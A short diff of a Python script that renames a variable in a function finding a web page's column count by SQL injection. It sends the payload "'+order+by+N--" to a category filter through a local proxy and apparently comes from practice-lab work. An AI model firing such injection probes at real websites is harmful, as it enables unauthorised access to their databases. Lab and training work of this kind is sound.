@@ -9,11 +9,11 @@ proxies = {
     'https': 'http://127.0.0.1:8080'}
 
 def get_exploit_column_number(url):
-    path = "filter?category=Gifts"
+    uri = "filter?category=Gifts"
     for number in range(1,50):
         payload = "'+order+by+%s--" %number
         response = requests.get(
-            url + path + payload,
+            url + uri + payload,
             verify=False,
             proxies=proxies)
         if "Internal Server Error" in response.text:
